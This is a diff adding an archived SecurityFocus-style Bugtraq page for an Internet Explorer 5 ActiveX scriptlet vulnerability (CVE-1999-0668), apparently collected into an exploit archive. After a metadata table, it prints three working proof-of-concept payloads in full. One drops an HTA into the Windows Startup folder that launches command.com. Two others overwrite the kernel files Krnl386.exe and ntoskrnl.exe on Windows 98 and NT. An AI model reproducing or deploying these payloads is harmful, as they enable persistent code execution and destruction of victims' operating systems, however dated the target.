@@ -1,0 +1,139 @@
+#SpeeDr00t@Black Falcon<br>#bid598<p><b><span style="font-size: 18pt;">Microsoft IE5 ActiveX  "Object for constructing type libraries for scriptlets" Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/598/info">info</a><br><a href="http://www.securityfocus.com/bid/598/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/598/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/598/solution">solution</a><br><a href="http://www.securityfocus.com/bid/598/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				598
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-1999-0668<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 21 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 16 2007 10:06PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Posted to Bugtraq by Georgi Guninski &lt;joro@NAT.BG&gt; on August 21, 1999.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Microsoft Internet Explorer  5.0 for Windows NT 4<br/>
+<span class="related">
+						
+							+ 
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					Microsoft Internet Explorer  5.0 for Windows 98<br/>
+<span class="related">
+						
+							+ 
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Microsoft Windows 98  <br/>
+</span>
+					
+				
+					Microsoft Internet Explorer  5.0 for Windows 95<br/>
+<span class="related">
+						
+							+ 
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Microsoft Windows 95  <br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Exploit by Georgi Guninski.<br/>A working demo is available at:<br/>http://www.nat.bg/~joro/scrtlb.html<br/><br/>&lt;object id="scr" <br/>   classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC" <br/>&gt; <br/>&lt;/object&gt; <br/>&lt;SCRIPT&gt; <br/>scr.Reset(); <br/>scr.Path="C:\\windows\\Start Menu\\Programs\\StartUp\\guninski.hta"; <br/>scr.Doc="&lt;object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'&gt;&lt;/object&gt;&lt;SCRIPT&gt;alert('Written by Georgi Guninski<br/>http://www.nat.bg/~joro');wsh.Run('c:\\command.com');&lt;/"+"SCRIPT&gt;"; <br/>scr.write(); <br/>&lt;/SCRIPT&gt; <br/>&lt;/object&gt; <br/><br/>Exploit by Seth Georgion<br/>A working demo is available at: http://www.sassproductions.com/hacked.htm<br/><br/>Windows 98:<br/> &lt;p&gt;<br/>&lt;object id="scr"<br/>   classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC" width="14"<br/>height="14"<br/>&gt;&lt;/object&gt;&lt;script&gt;<br/>scr.Reset();<br/>scr.Path="C:\\windows\\system\\Krnl386.exe";<br/>scr.Doc="&lt;object id='wsh'<br/>classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'&gt;&lt;/object&gt;&lt;SCRIPT&gt;alert(<br/>'Screw Denise Richards, Debbie Johnson<br/>r0x!');wsh.Run('c:\\command.com');&lt;/"+"SCRIPT&gt;";<br/>scr.write();<br/>&lt;/script&gt;<br/>&lt;/p&gt;<br/><br/>Windows NT:<br/>&lt;p&gt;<br/>&lt;object id="scr" classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"<br/>width="14" height="14"&gt;<br/>&lt;/object&gt;<br/>&lt;script&gt;<br/>scr.Reset();<br/>scr.Path="C:\\WINNT\\System32\\ntoskrnl.exe";<br/>scr.Doc="&lt;object id='wsh'<br/>classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'&gt;&lt;/object&gt;&lt;SCRIPT&gt;alert(<br/>'Screw Denise Richards, Debbie Johnson<br/>r0x!');wsh.Run('c:\\command.com');&lt;/"+"SCRIPT&gt;";<br/>scr.write();<br/>&lt;/script&gt;<br/>&lt;/p&gt;
+	
+		<ul>
+</ul>
+</div>
